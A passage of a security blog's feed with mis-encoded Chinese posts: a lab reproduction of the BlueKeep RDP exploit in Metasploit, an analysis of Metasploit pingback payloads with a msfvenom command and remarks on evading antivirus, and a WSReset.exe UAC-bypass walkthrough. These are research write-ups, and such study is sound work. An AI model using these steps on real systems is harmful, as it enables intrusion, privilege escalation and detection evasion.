&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-09-10 01:20:33&lt;br&gt;&lt;img src=&quot;/wallpaper/thumb-1920-584470.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id
      
    
    </summary>
    
      <category term="Write-up" scheme="http://patrilic.top/categories/Write-up/"/>
    
    
      <category term="n1ctf-pentest" scheme="http://patrilic.top/tags/n1ctf-pentest/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0708 RDP è¿œç¨‹ä»£ç æ‰§è¡Œ</title>
    <link href="http://patrilic.top/2019/09/09/CVE-2019-0708%20RDP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>http://patrilic.top/2019/09/09/CVE-2019-0708 RDP è¿œç¨‹ä»£ç æ‰§è¡Œ/</id>
    <published>2019-09-09T09:03:55.000Z</published>
    <updated>2019-09-09T12:07:38.289Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-09-09 17:03:55<br><img src="/wallpaper/8.png" alt></p></blockquote><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>RDPæœåŠ¡çš„æ¼æ´ï¼Œé™¤äº†ä¹‹å‰çš„<code>ms12-020</code>(è¡¥ä¸å·ï¼š<code>KB2621440</code>)ï¼Œå½±å“æœ€è½°åŠ¨çš„ä¹Ÿå°±æ˜¯è¿™æ¬¡çš„<code>bluekeep</code>äº†ï¼Œhwä¹‹å‰çˆ†å‡ºçš„æ¼æ´ï¼Œå‰ä¸¤å¤©<code>rapid7</code>å®˜æ–¹åœ¨githubä¸Šä¼ äº†æœ€æ–°çš„expï¼Œå¯ç›´æ¥åˆ©ç”¨ã€‚</p><p><strong>å½±å“èŒƒå›´</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Windows 7</span><br><span class="line"></span><br><span class="line">Windows Server 2008 R2</span><br><span class="line"></span><br><span class="line">Windows Server 2008</span><br><span class="line"></span><br><span class="line">Windows Server 2003</span><br><span class="line"></span><br><span class="line">Windows XP</span><br></pre></td></tr></table></figure></p><h2 id="0x01-æ¼æ´å¤ç°"><a href="#0x01-æ¼æ´å¤ç°" class="headerlink" title="0x01 æ¼æ´å¤ç°"></a>0x01 æ¼æ´å¤ç°</h2><p>ç›®å‰éœ€è¦æ›¿æ¢expåŒ…ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯MacOSç¯å¢ƒï¼ˆexpåŒ…åˆ°å¤„éƒ½æœ‰ï¼Œå°±ä¸æ”¾äº†)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cve_2019_0708_bluekeep_rce.rb æ·»åŠ åˆ° /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br><span class="line"></span><br><span class="line">rdp.rb æ›¿æ¢ /opt/metasploit-framework/embedded/framework/lib/msf/core</span><br><span class="line"></span><br><span class="line">rdp_scanner.rb æ›¿æ¢ /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/dp_scanner.rb</span><br><span class="line"></span><br><span class="line">cve_2019_0708_bluekeep.rb æ›¿æ¢ /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br></pre></td></tr></table></figure></p><p>æ›¿æ¢å®Œæˆä¹‹åä½¿ç”¨<code>reload_all</code>åŠ è½½æ¨¡å—<br><img src="/CVE-2019-0708 RDP è¿œç¨‹ä»£ç æ‰§è¡Œ.resources/6BC0D3A6-C794-4D55-A0DA-DD40C87198D4.png" alt="5bd7750bf0e644937edf8c6a1474e664"></p><p>å¯ä»¥çœ‹åˆ°å­˜åœ¨4ä¸ªtargetsï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯VMWareï¼Œæ‰€ä»¥é€‰target 3</p><p><strong>Windows 7 ultimate SP1</strong><br><img src="/CVE-2019-0708 RDP è¿œç¨‹ä»£ç æ‰§è¡Œ.resources/FFEE06BD-258D-411F-AA56-C7D79F037E53.png" alt="e147fe734985ded3f8137442b883e5ec"></p><p>ä½†æ˜¯å…³æ‰sessionåé‡æ–°æ‰“ç¬¬äºŒæ¬¡ï¼Œå°±è“å±äº†<br><img src="/CVE-2019-0708 RDP è¿œç¨‹ä»£ç æ‰§è¡Œ.resources/3DFEC667-3E43-47DD-B13E-C09010C459CA.png" alt="2342e02c78bd2677c4bbcc38523587d8"></p><p><strong>Windows Server 2008 R2</strong> ï¼Œæœç„¶è“å±äº†2333<br><img src="/CVE-2019-0708 RDP è¿œç¨‹ä»£ç æ‰§è¡Œ.resources/CCAF6F35-964F-47EB-B380-50B4BC89BD17.png" alt="a38d2f7b12e397248a5dfc1cdc8c9d37"></p><h2 id="0x02-æ€»ç»“"><a href="#0x02-æ€»ç»“" class="headerlink" title="0x02 æ€»ç»“"></a>0x02 æ€»ç»“</h2><p>å¬å¤§ä½¬è¯´ï¼Œæ ¸å¿ƒä»£ç è¿˜æ²¡æ”¾å‡ºæ¥ï¼Œæµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°é™¤äº†08çš„ä¸èƒ½æˆåŠŸï¼Œå…¶ä»–éƒ½è¿˜okï¼Œï¼ˆå¬è¯´éœ€è¦ä¿®æ”¹æ³¨å†Œè¡¨ï¼‰</p><h2 id="0x03-ç›¸å…³é“¾æ¥ğŸ”—"><a href="#0x03-ç›¸å…³é“¾æ¥ğŸ”—" class="headerlink" title="0x03 ç›¸å…³é“¾æ¥ğŸ”—"></a>0x03 ç›¸å…³é“¾æ¥ğŸ”—</h2><p><a href="https://www.freebuf.com/news/203584.html" target="_blank" rel="noopener">https://www.freebuf.com/news/203584.html</a><br><a href="https://www.freebuf.com/vuls/205380.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/205380.html</a><br><a href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2012/ms12-020" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2012/ms12-020</a><br><a href="https://github.com/rapid7/metasploit-framework/pull/12283/files#diff-880ad99e50249db44c2f19b94f7a4870" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/pull/12283/files#diff-880ad99e50249db44c2f19b94f7a4870</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-09-09 17:03:55&lt;br&gt;&lt;img src=&quot;/wallpaper/8.png&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a hr
      
    
    </summary>
    
      <category term="æ¼æ´å¤ç°" scheme="http://patrilic.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="BlueKeep" scheme="http://patrilic.top/tags/BlueKeep/"/>
    
  </entry>
  
  <entry>
    <title>MSF Pingback Payloads</title>
    <link href="http://patrilic.top/2019/09/06/Payloads/"/>
    <id>http://patrilic.top/2019/09/06/Payloads/</id>
    <published>2019-09-05T16:47:46.000Z</published>
    <updated>2019-09-16T06:42:00.915Z</updated>
    
    <content type="html"><![CDATA[<p><a name="JSO7R"></a></p><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><blockquote><p>æ–‡ç« é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºï¼Œæ–‡ç« é“¾æ¥ï¼š<a href="https://xz.aliyun.com/t/6268" target="_blank" rel="noopener">https://xz.aliyun.com/t/6268</a></p></blockquote><p>ä»Šå¤©æ—©ä¸ŠRapid7cnçš„å…¬ä¼—å·æ›´æ–°äº†ä¸€ç¯‡æ–‡ç« ï¼Œç„¶åå°±è¢«ç¾¤é‡Œçš„å¤§å¸ˆå‚…ä»¬è½¬å‘äº†å¥½å‡ é233ï¼Œæ„Ÿè§‰æŒºæœ‰æ„æ€çš„ï¼Œä¹Ÿæƒ³ç€åˆ†æä¸€ä¸‹</p><p><a href="https://mp.weixin.qq.com/s/ZI-qQ_ORKG_gJ2Wnc2PiRA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ZI-qQ_ORKG_gJ2Wnc2PiRA</a></p><p>å®˜ç½‘ï¼š <a href="https://blog.rapid7.com/2019/08/01/introducing-pingback-payloads/" target="_blank" rel="noopener">https://blog.rapid7.com/2019/08/01/introducing-pingback-payloads/</a><br><a name="mXsId"></a></p><h2 id="0x01-pingback"><a href="#0x01-pingback" class="headerlink" title="0x01 pingback"></a>0x01 pingback</h2><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567694251815-6a249db8-4ac8-4a27-b999-49869d8138d5.png" alt="image.png">è¿™æ¬¡ä¸€å…±æ›´æ–°äº†10ä¸ªpingback payload, è‡³äºä»€ä¹ˆæ˜¯pingbackï¼Œå…¶å®msfå®˜æ–¹åœ¨githubå·²ç»è¯´çš„å¾ˆæ¸…æ¥šäº†<br><a href="https://github.com/rapid7/metasploit-framework/pull/12129" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/pull/12129</a></p><blockquote><p>Pingback payloads are designed to provide a limited-functionality payload to verify an exploit has worked. <strong>It does not provide a shell of any kind.</strong> A pingback payload creates a â€œrandomâ€ UUID value (separate from the payload UUID) that is written to the Metasploit database along with other data. When executed on target, the payload sends back that UUID to verify that the exploit worked, but nothing else. When Framework receives that UUID, we verify the target is vulnerable to the exploit without loading an interactive shell.<br>This prevents traditional [W/M]ITM attacks or someone sniffing the traffic for information, as the UUID itself means nothing to a listener, and without further execution, the session itself is not particularly valuable to an attacker.</p></blockquote><p>ç®€å•æ¥è¯´æ„Ÿè§‰å…¶å®å°±æ˜¯ï¼ŒAVå¯¹msfä¹‹å‰çš„å¸¸è§„reverse_shellä¼šè¿›è¡Œæ‹¦æˆªï¼Œå¯¼è‡´æˆ‘ä»¬å¹¶ä¸èƒ½å¾ˆæ¸…æ¥šçš„çŸ¥é“ç›®æ ‡æ˜¯å¦å­˜åœ¨è¯¥æ¼æ´ï¼Œç„¶åè¿™ä¸ªpayloadå°±å®Œå…¨ä¸ä¼šäº§ç”Ÿäº¤äº’å¼shellï¼Œè€Œåªæ˜¯è¿”å›ä¸€ä¸ªUUIDï¼Œèƒ½è®©æˆ‘ä»¬çŸ¥é“poc/expæ˜¯å¦æ‰§è¡ŒæˆåŠŸï¼Œç„¶åç›®æ ‡æ˜¯å¦å­˜åœ¨å½“å‰æ¼æ´ï¼Œè€Œä¸å¿…æ‹…å¿ƒè¢«ä¸­é—´äººæ”»å‡»æˆ–è€…è¢«æ‹¦æˆª</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567696662682-c96fa1cc-966d-4b06-b19e-2d52f8884ed3.png" alt="image.png"></p><h2 id="0x02-How-to-Use"><a href="#0x02-How-to-Use" class="headerlink" title="0x02 How to Use"></a>0x02 How to Use</h2><p>ç¿»çœ‹ä»£ç ï¼Œæˆ‘ä»¬å‘ç°å®ƒå…¶å®æ˜¯æ¯æ¬¡ç”Ÿæˆä¸€ä¸ªæ–°çš„UUIDï¼Œç„¶åå°†å…¶å‘é€åˆ°ç›®æ ‡ä¸­ï¼Œç„¶åè°ƒç”¨listenerä¸­çš„payloadè®¾ç½®ä¸€ä¸ªç›‘å¬ï¼Œç„¶åå½“ç¨‹åºè¿›è¡Œ <code>Pingback</code> æ—¶ï¼ŒMSFæ‰“å¼€ä¸€ä¸ªä¼šè¯æ¥æ¥å—UUIDï¼Œæœ€åæ‹¿åˆ°å®Œæ•´UUIDåï¼Œå°±å…³é—­å½“å‰session</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># msf/modules/payloads/singles/ruby/pingback_reverse_tcp.rb</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ruby_string</span></span></span><br><span class="line">    <span class="keyword">self</span>.pingback_uuid <span class="params">||</span>= <span class="keyword">self</span>.generate_pingback_uuid</span><br><span class="line">    lhost = datastore[<span class="string">'LHOST'</span>]</span><br><span class="line">    lhost = <span class="string">"[<span class="subst">#&#123;lhost&#125;</span>]"</span> <span class="keyword">if</span> Rex::Socket.is_ipv6?(lhost)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"require'socket';"</span> \</span><br><span class="line">      <span class="string">"c=TCPSocket.new'<span class="subst">#&#123;lhost&#125;</span>',<span class="subst">#&#123;datastore[<span class="string">'LPORT'</span>].to_i&#125;</span>;"</span> \</span><br><span class="line">      <span class="string">"c.puts'<span class="subst">#&#123;[[<span class="keyword">self</span>.pingback_uuid].pack(<span class="string">'H*'</span>)].pack(<span class="string">'m0'</span>)&#125;</span>'.unpack('m0');"</span></span><br><span class="line">      <span class="string">"c.close"</span></span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># msf/base/sessions/pingback.rb</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uuid_read</span></span></span><br><span class="line">    uuid_raw = rstream.get_once(<span class="number">16</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span> <span class="keyword">unless</span> uuid_raw</span><br><span class="line">    <span class="keyword">self</span>.uuid_string = uuid_raw.each_byte.map &#123; <span class="params">|b|</span> <span class="string">"%02x"</span> % b.to_i() &#125;.join</span><br><span class="line">    print_status(<span class="string">"Incoming UUID = <span class="subst">#&#123;uuid_string&#125;</span>"</span>)</span><br><span class="line">    <span class="keyword">if</span> framework.db.active</span><br><span class="line">      <span class="keyword">begin</span></span><br><span class="line">        payload = framework.db.payloads(<span class="symbol">uuid:</span> uuid_string).first</span><br><span class="line">        <span class="keyword">if</span> payload.<span class="literal">nil</span>?</span><br><span class="line">          print_warning(<span class="string">"Provided UUID (<span class="subst">#&#123;uuid_string&#125;</span>) was not found in database!"</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          print_good(<span class="string">"UUID identified (<span class="subst">#&#123;uuid_string&#125;</span>)"</span>)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">rescue</span> ActiveRecord::ConnectionNotEstablished</span><br><span class="line">        print_status(<span class="string">"WARNING: UUID verification and logging is not available, because the database is not active."</span>)</span><br><span class="line">      <span class="keyword">rescue</span> =&gt; e</span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> Can we have a more specific exception handler?</span></span><br><span class="line">        <span class="comment"># Test: what if we send no bytes back?  What if we send less than 16 bytes?  Or more than?</span></span><br><span class="line">        elog(<span class="string">"Can't get original UUID"</span>)</span><br><span class="line">        elog(<span class="string">"Exception Class: <span class="subst">#&#123;e.<span class="keyword">class</span>.name&#125;</span>"</span>)</span><br><span class="line">        elog(<span class="string">"Exception Message: <span class="subst">#&#123;e.message&#125;</span>"</span>)</span><br><span class="line">        elog(<span class="string">"Exception Backtrace: <span class="subst">#&#123;e.backtrace&#125;</span>"</span>)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      print_warning(<span class="string">"WARNING: UUID verification and logging is not available, because the database is not active."</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨ <code>option.rb</code> ä¸­ï¼Œæˆ‘ä»¬èƒ½çœ‹åˆ°pingbackçš„æ¨¡å—å­˜åœ¨ä¸¤ä¸ªé€‰é¡¹ï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(info = &#123;&#125;)</span></span></span><br><span class="line">    <span class="keyword">super</span></span><br><span class="line">    register_advanced_options(</span><br><span class="line">      [</span><br><span class="line">        Msf::OptInt.new(<span class="string">'PingbackRetries'</span>, [<span class="literal">true</span>, <span class="string">"How many additional successful pingbacks"</span>, <span class="number">0</span>]),</span><br><span class="line">        Msf::OptInt.new(<span class="string">'PingbackSleep'</span>, [<span class="literal">true</span>, <span class="string">"Time (in seconds) to sleep between pingbacks"</span>, <span class="number">30</span>])</span><br><span class="line">      ], <span class="keyword">self</span>.<span class="keyword">class</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure><ul><li>PingbackRetries  - pingbackçš„æ¬¡æ•°</li><li>PingbackSleep - pinigbackçš„æ—¶é—´é—´éš”</li></ul><p>æˆ‘ä»¬åˆ©ç”¨ <code>Msfvenom</code> ç”Ÿæˆä¸€ä¸ª <code>windows/x64/pingback_reverse_tcp</code> çš„exeæœ¨é©¬</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/pingback_reverse_tcp -f exe -o patrilic.exe LHOST=<span class="number">192.168</span>.<span class="number">1.107</span> LPORT=<span class="number">4445</span> EXITFUNC=thread PINGBACKRETRIES=<span class="number">10</span> PINGBACKSLEEP=<span class="number">5</span></span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œæ—¶ï¼š</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567698698752-8e60bbfb-8134-4cae-a909-80499d4ab5c2.png" alt="image.png"><br>åªä¼šè¿”å›UUID<br><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567698945771-f65f647a-3285-42e1-863e-29555f64cca5.png" alt="image.png"></p><p>ç„¶åç›®æ ‡æœºå™¨ä¸Šå¹¶æ²¡æœ‰äº§ç”Ÿä»»ä½•çš„äº¤äº’å¼shellï¼ŒåŒæ—¶ä½¿ç”¨ <code>Wireshark</code> ä¹Ÿåªèƒ½æ•è·åˆ°16byteçš„UUIDå€¼</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567699063357-40b97628-fdfa-4c67-951a-546ce62b1f6e.png" alt="image.png"></p><h2 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03 æ€»ç»“"></a>0x03 æ€»ç»“</h2><p>è¿™æ¬¡æ›´æ–°çš„pingback payloadï¼Œå·²ç»æ„Ÿè§‰æ˜¯æœ€å°åŒ–çš„æ”»å‡»è½½è·äº†ï¼Œè€Œä¸”ç‰¹å¾ä¹Ÿå¹¶ä¸æ˜æ˜¾ï¼Œåªæ˜¯ä¸€ä¸²éšæœºçš„UUIDå€¼è€Œå·²ï¼Œæ„Ÿè§‰ç”¨æ¥éªŒè¯æ¼æ´è¿˜æ˜¯æŒºä¸é”™çš„ï¼Œç„¶ååé¢å†åŠæ³•å»æ‰expç‰¹å¾ï¼Œä½¿ç”¨å¦å¤–çš„æ–¹å¼æ¥è·å¾—äº¤äº’å¼shellæˆ–è€…ç›´æ¥æ‰§è¡Œå‘½ä»¤äº‘äº‘.. å½“ç„¶ï¼Œmsfç›´æ¥ç”Ÿæˆçš„ç¨‹åºç‰¹å¾è¿˜æ˜¯æŒºæ˜æ˜¾çš„ï¼Œè¿˜æ˜¯éœ€è¦è¿›è¡Œå…æ€ï¼Œä¸è¿‡ç”±äºè¿™ä¸ªpayloadå¹¶æ²¡æœ‰è¿›è¡Œèµ·æ•æ„Ÿè¿›ç¨‹ï¼Œæ‰€ä»¥è¿˜æ˜¯æ¯”è¾ƒå¥½å…æ€çš„ã€‚</p><p>shellcodeéšä¾¿åŠ å¯†æäº†ä¸‹ï¼Œé™æ€è¿˜è¡Œï¼Œä½†æ˜¯åŠ¨æ€ä¼°è®¡ä¹Ÿæ²¡å•¥2333æ¯•ç«Ÿä¹Ÿæ²¡æœ‰å±é™©è¿›ç¨‹ï¼Œåªæ˜¯å¼€äº†ä¸ªsocket</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567701851264-0e1de3de-9aec-49dd-99cc-278ba2685e22.png#align=left&amp;display=inline&amp;height=937&amp;name=image.png&amp;originHeight=1874&amp;originWidth=3358&amp;size=497343&amp;status=done&amp;width=1679" alt="image.png"></p><p>ç„¶åè¿›ç¨‹å¼€èµ·æ¥çš„è¯ï¼Œæ‰¾äº†ä¸ª360çš„æœºå­è¯•äº†ä¸‹ï¼Œæ²¡å•¥é—®é¢˜</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567701981644-609e99b8-e943-4859-96fb-00c8d6ffa46e.png" alt="image1.png"></p><p>ä¸è¿‡ç‰¹å¾ä¼°è®¡ä¹Ÿå¿«æ™®åŠäº†ï¼Œæ„Ÿè§‰æ€è·¯æŒºå¥½çš„ï¼Œå­¦ä¹ äº†ï½</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a name=&quot;JSO7R&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;æ–‡ç« é¦–å‘äºå…ˆçŸ¥ç¤¾åŒº
      
    
    </summary>
    
      <category term="Red-Team Tricks" scheme="http://patrilic.top/categories/Red-Team-Tricks/"/>
    
    
      <category term="metasploit" scheme="http://patrilic.top/tags/metasploit/"/>
    
  </entry>
  
  <entry>
    <title>Windows10 BypassUAC with WSReset.exe</title>
    <link href="http://patrilic.top/2019/08/29/Windows10%20BypassUAC%20with%20WSReset.exe/"/>
    <id>http://patrilic.top/2019/08/29/Windows10 BypassUAC with WSReset.exe/</id>
    <published>2019-08-29T15:51:00.000Z</published>
    <updated>2019-08-30T00:49:55.667Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>Time: 2019-08-29 23:51:00<br><img src="/wallpaper/63740442.png" alt></p></blockquote><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p><a href="https://heynowyouseeme.blogspot.com/2019/08/windows-10-lpe-uac-bypass-in-windows.html" target="_blank" rel="noopener">https://heynowyouseeme.blogspot.com/2019/08/windows-10-lpe-uac-bypass-in-windows.html</a></p><p>åˆ©ç”¨<code>WSReset.exe</code>è¿›è¡ŒbypassUACã€‚</p><p>ä¸ºä»€ä¹ˆåªé™äºWin10å‘¢ï¼Œå› ä¸ºè¿™ä¸ªä½äº<code>C:\WINDWOS\System32</code> ç›®å½•ä¸‹çš„ç¨‹åºï¼Œæ˜¯å¾®è½¯å•†åº—çš„ä¸€ä¸ªå·¥å…·<br><img src="/Windows10 BypassUAC with WSReset.exe.resources/E969032A-4448-40D0-9389-395E1D9502AA.png" alt="6f262c0c97c3dfb682f04fd809cf60e3"></p><h2 id="0x01-Bypass"><a href="#0x01-Bypass" class="headerlink" title="0x01 Bypass"></a>0x01 Bypass</h2><p>è¿™é‡ŒåŸä½œè€…è‡ªå·±ç¼–å†™äº†è„šæœ¬å’Œå·¥å…·ï¼š<br><a href="https://github.com/sailay1996/UAC_bypass_windows_store" target="_blank" rel="noopener">https://github.com/sailay1996/UAC_bypass_windows_store</a></p><p>é¦–å…ˆä½¿ç”¨<code>UAC.bat</code><br><img src="/Windows10 BypassUAC with WSReset.exe.resources/CB964BB5-BB3A-4D53-A67C-6E6454849741.png" alt="ec35f36d2e88012ed02af35cbc09e1f0"></p><p>åˆ›å»ºä¸€ä¸ªå¸¦ç©ºæ ¼å­—ç¬¦çš„ç›®å½•ï¼Œç„¶åæŠŠWSResetæ‰”è¿›å»</p><p>æ¥ç€è¿è¡Œ<code>uac_bypass.exe</code><br><img src="/Windows10 BypassUAC with WSReset.exe.resources/8FF6C343-6736-4498-A988-5766929E0EFD.png" alt="c4add2018e585c2ca68544c6acabb04e"></p><p>è°ƒç”¨DLLï¼Œå¼¹å‡ºå¯¹è¯æ¡†<br><img src="/Windows10 BypassUAC with WSReset.exe.resources/A6D6CAA5-A74F-4965-B791-F1E7FCDDC7B7.png" alt="605ad7a9df01dc55e5392b562a029677"><br>ä¸»è¦å°±æ˜¯å› ä¸ºè¿™ä¸ªğŸ‘‰<br><img src="/Windows10 BypassUAC with WSReset.exe.resources/32B27C2A-82C9-4934-9CCD-3051DBEAC8A7.png" alt="589206bf8c6b67a17a09253985b8e353"></p><p>ç„¶åä¼šå¼¹å‡ºä¸€ä¸ªç®¡ç†å‘˜çš„CMD<br><img src="/Windows10 BypassUAC with WSReset.exe.resources/B375540E-97FA-4751-8A24-9A0385A5341F.png" alt="4c6538e20548f14902cfd64df18f0cb6"></p><p>ä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œè™šæ‹Ÿæœºä¸€ç›´ä¿æŒé«˜é€Ÿä¸‹è½½<br><img src="/Windows10 BypassUAC with WSReset.exe.resources/92007680-2629-45ED-AE96-E6C8863511D2.png" alt="f1748df2675213d7fa216762acb9be4c"></p><p>æ„Ÿè§‰ç¨‹åºé‡Œæœ‰äº›ä¸œè¥¿..åé¢æ— èŠå†åˆ†æå§ã€‚</p><h2 id="0x02-æ€»ç»“"><a href="#0x02-æ€»ç»“" class="headerlink" title="0x02 æ€»ç»“"></a>0x02 æ€»ç»“</h2><p>bypassUACæ–¹æ³•å¤šç§å¤šæ ·ï¼Œçœ‹è¿™ä¸ªåªæ˜¯å› ä¸ºå¥½ç©ï¼Œç”¨å¾®è½¯æ²¡å•¥ç”¨çš„åº”ç”¨å•†åº—çš„ç»„ä»¶ï¼Œå…¶å®æœ¬è´¨ä¸Šè¿˜æ˜¯DLLåŠ«æŒ2333</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;Time: 2019-08-29 23:51:00&lt;br&gt;&lt;img src=&quot;/wallpaper/63740442.png&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-å‰è¨€&quot;
      
    
    </summary>
    
      <category term="BypassUac" scheme="http://patrilic.top/categories/BypassUac/"/>
    
    
      <category term="å†…ç½‘æ¸—é€" scheme="http://patrilic.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Ecshop 2.x/3.x SQLæ³¨å…¥ + ä»£ç æ‰§è¡Œ</title>
    <link href="http://patrilic.top/2019/08/27/Ecshop%202.x%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>http://patrilic.top/2019/08/27/Ecshop 2.x ä»£ç æ‰§è¡Œ/</id>
    <published>2019-08-26T16:03:02.000Z</published>
    <updated>2019-08-27T18:00:58.699Z</updated>
    
